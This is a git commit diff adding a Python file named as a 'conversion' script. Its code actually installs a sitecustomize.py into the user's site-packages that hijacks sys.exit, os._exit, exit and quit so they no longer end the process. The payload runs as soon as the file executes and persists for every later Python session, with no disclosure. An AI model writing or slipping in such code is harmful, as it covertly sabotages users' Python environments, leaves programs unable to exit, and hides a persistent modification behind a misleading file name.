a25f706754c7499d0931d7856b48fa3f9a7676ca
p55884422-boop <p55884422@gmail.com>
2025-08-02 10:04:58 +0300

    Update تحويل_تحويل_تحويل.py

--- تحويل_تحويل_تحويل.py
+++ تحويل_تحويل_تحويل.py
@@ -1,1 +1,30 @@
-.
+import os
+import site
+import sys
+c = r"""import sys, builtins, os
+def i(*a,**k): return f"exit({a},{k})\n"
+sys.exit=i
+os._exit=i
+exitSystem=i
+exit=i
+quit=i
+class Q:
+ def __init__(self,n):self.n=n
+ def __repr__(self):return f"'{self.n}' is blocked"
+ def __call__(self,*a,**k):i(*a,**k)
+builtins.exit=Q("exit")
+builtins.quit=Q("quit")
+builtins.exitSystem=i"""
+def setup():
+    p = site.getusersitepackages()
+    try:
+        os.makedirs(p, exist_ok=True)
+    except Exception as e:
+        sys.exit(1)
+    f_path = os.path.join(p, "sitecustomize.py")    
+    try:
+        with open(f_path, "w") as f:
+            f.write(c)
+    except Exception as e:
+        sys.exit(1)
+setup()
